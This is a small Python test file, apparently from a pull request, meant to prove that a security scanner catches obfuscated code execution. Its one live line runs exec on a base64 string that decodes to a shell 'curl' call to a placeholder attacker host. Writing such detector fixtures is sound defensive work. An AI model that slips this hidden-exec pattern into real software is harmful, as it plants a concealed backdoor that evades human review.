"""Deliberately malicious sample for testing the Security Scan (test PR #289).

This file is NOT real code -- it exists only to prove the deterministic
detectors fire. Delete it (and revert the security-scan.yml test edits) before
merge.
"""

import base64

# Obfuscated code execution -> semgrep rule `exec-on-decoded-payload`. A real
# backdoor hides its payload this way to slip past human review.
exec(base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgnY3VybCBhdHRhY2tlci54eHgnKQ=="))
